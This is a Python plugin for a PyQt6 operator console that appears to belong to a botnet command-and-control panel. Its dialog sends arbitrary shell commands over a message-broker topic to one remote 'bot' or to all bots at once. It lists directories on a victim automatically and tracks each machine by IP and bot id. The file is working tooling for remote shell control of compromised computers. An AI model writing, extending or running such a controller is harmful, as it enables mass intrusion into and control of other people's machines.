# plugins/shell_access.py
from PyQt6.QtWidgets import QDialog, QTextEdit, QLineEdit, QFormLayout, QPushButton, QHBoxLayout
from PyQt6.QtCore import QTimer
from .base_plugin import BasePlugin
import json

class ShellAccessDialog(QDialog):
    def __init__(self, parent=None, target="all", current_dir="", client=None, topic="/commands/"):
        super().__init__(parent)
        self.client = client
        self.topic = topic
        self.target = target
        # Set default current_dir: "all" for all bots, "C:/" for a single bot if not specified
        self.current_dir = current_dir if current_dir else ("all" if target == "all" else "C:/")
        print(f"ShellAccessDialog initialized with target={target}, current_dir={self.current_dir}")
        self.setWindowTitle('Shell Access')
        self.setMinimumSize(600, 300)
        self.setStyleSheet("""
            QDialog { background-color: #1a1a1a; color: #00ff00; }
            QLineEdit { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QTextEdit { 
                background-color: #2a2a2a; 
                color: #00ff00; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton { 
                background-color: #333333; 
                color: #00ff00; 
                padding: 8px; 
                border: 2px solid #00ff00; 
                font-family: 'Courier New'; 
                font-size: 12px; 
            }
            QPushButton:hover { background-color: #444444; }
        """)
        layout = QFormLayout()
        self.output_area = QTextEdit()
        self.output_area.setReadOnly(True)
        self.command_input = QLineEdit()
        self.command_input.setText(f"{self.current_dir}: > ")
        self.command_input.setCursorPosition(len(self.command_input.text()))
        layout.addRow('Output:', self.output_area)
        layout.addRow('Command:', self.command_input)
        submit_button = QPushButton('Execute')
        submit_button.clicked.connect(self.execute_command)
        close_button = QPushButton('Close')
        close_button.clicked.connect(self.accept)
        button_layout = QHBoxLayout()
        button_layout.addWidget(submit_button)
        button_layout.addWidget(close_button)
        layout.addRow(button_layout)
        self.setLayout(layout)
        # Delay the automatic 'dir' command until the dialog is fully initialized
        if target != "all":
            QTimer.singleShot(0, lambda: self.execute_command("dir"))
            print(f"Scheduled automatic 'dir' command for target={target}")

    def execute_command(self, command=None):
        command_text = command if command else self.command_input.text()
        if not command and command_text.startswith(f"{self.current_dir}: > "):
            command_text = command_text[len(f"{self.current_dir}: > "):].strip()
        else:
            command_text = command_text.strip()
        if command_text:
            if command_text.lower() == "clear":
                print("ShellAccessDialog clearing output on 'clear' command")
                self.output_area.clear()
            else:
                cmd = {'type': 'command', 'target': self.target, 'action': 'shell', 'command': command_text}
                self.client.publish(self.topic, json.dumps(cmd))
                print(f"ShellAccessDialog sent command: {cmd}")
            self.command_input.setText(f"{self.current_dir}: > ")
            self.command_input.setCursorPosition(len(self.command_input.text()))

    def update_response(self, response):
        print(f"ShellAccessDialog updating response: {response}")
        self.current_dir = response.get('current_dir', self.current_dir)
        # Replace backslashes with forward slashes for display
        self.current_dir = self.current_dir.replace('\\', '/')
        result = response.get('result', 'No response')
        output = f"{self.current_dir}: >\n{result}"
        print(f"ShellAccessDialog appending output: {output}")
        self.output_area.append(output)
        self.command_input.setText(f"{self.current_dir}: > ")
        self.command_input.setCursorPosition(len(self.command_input.text()))

class ShellAccessPlugin(BasePlugin):
    def __init__(self, parent):
        super().__init__(parent)
        self.name = "Shell Access"
        self.menu_action = self.name
        self.priority = 40
        self.dialogs = {}
        self.current_dirs = {}  # Store current_dir for each target

    def execute(self, target):
        current_dir = self.current_dirs.get(target, "")
        dialog = ShellAccessDialog(self.parent, target, current_dir, client=self.parent.client, topic=self.parent.topic)
        self.dialogs[target] = dialog
        dialog.exec()
        del self.dialogs[target]

    def handle_response(self, data):
        if data.get('type') == 'shell_response':
            ip = data['ip']
            bot_id = data['id']
            target = f"{ip}:{bot_id}" if 'target' not in locals() else 'all'
            dialog = self.dialogs.get(target)
            print(f"ShellAccessPlugin handle_response: target={target}, dialog found={dialog is not None}")
            if dialog:
                self.current_dirs[target] = data.get('current_dir', dialog.current_dir)
                dialog.update_response(data)